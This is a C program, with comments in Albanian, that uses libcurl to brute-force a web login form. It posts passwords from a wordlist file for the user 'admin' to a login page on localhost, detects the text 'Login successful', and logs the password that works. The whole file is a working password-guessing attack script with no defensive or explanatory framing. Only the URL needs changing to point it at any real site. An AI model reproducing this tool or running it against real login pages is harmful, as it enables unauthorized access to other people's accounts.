#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <curl/curl.h>

#define URL "http://localhost/login.php" 
#define USERNAME "admin"                 
#define PASSWORD_LIST_FILE "passwords.txt" 
#define LOG_FILE "successful_login.txt"   

// Buffer për të ruajtur përgjigjen e serverit
struct Memory {
    char *response;
    size_t size;
};

// Callback për të ruajtur përgjigjen e serverit
size_t write_callback(void *contents, size_t size, size_t nmemb, void *userp) {
    size_t realsize = size * nmemb;
    struct Memory *mem = (struct Memory *)userp;

    char *ptr = realloc(mem->response, mem->size + realsize + 1);
    if (ptr == NULL) {
        fprintf(stderr, "Not enough memory (realloc failed)\n");
        return 0;
    }

    mem->response = ptr;
    memcpy(&(mem->response[mem->size]), contents, realsize);
    mem->size += realsize;
    mem->response[mem->size] = 0;

    return realsize;
}

int attemptLogin(CURL *curl, const char *username, const char *password) {
    CURLcode res;
    char postdata[256];
    struct Memory chunk = {NULL, 0};
    FILE *logfile;

    snprintf(postdata, sizeof(postdata), "username=%s&password=%s", username, password);

    curl_easy_setopt(curl, CURLOPT_URL, URL);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, postdata);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&chunk);

    res = curl_easy_perform(curl);

    if (res != CURLE_OK) {
        fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
    } else {
        // Kontrollo nëse përgjigja përmban frazën "Login successful"
        if (strstr(chunk.response, "Login successful")) {
            printf("Found password: %s\n", password);

            logfile = fopen(LOG_FILE, "a");
            if (logfile == NULL) {
                perror("Failed to open log file");
                exit(1);
            }

            fprintf(logfile, "Username: %s\nPassword: %s\n\n", username, password);
            fclose(logfile);

            free(chunk.response);
            exit(0);
        }
    }

    printf("Tried password: %s\n", password);

    // Liro memorien
    free(chunk.response);
    return 0;
}

int main() {
    CURL *curl;
    FILE *password_file;
    char password[100];

    curl_global_init(CURL_GLOBAL_DEFAULT);
    curl = curl_easy_init();

    if (!curl) {
        fprintf(stderr, "Failed to initialize curl\n");
        return 1;
    }

    password_file = fopen(PASSWORD_LIST_FILE, "r");
    if (!password_file) {
        perror("Failed to open password list");
        return 1;
    }

    while (fgets(password, sizeof(password), password_file)) {
        // Hiq karakterin e newline nga passwordi
        password[strcspn(password, "\n")] = '\0';

        attemptLogin(curl, USERNAME, password);
    }

    fclose(password_file);
    curl_easy_cleanup(curl);
    curl_global_cleanup();

    return 0;
}

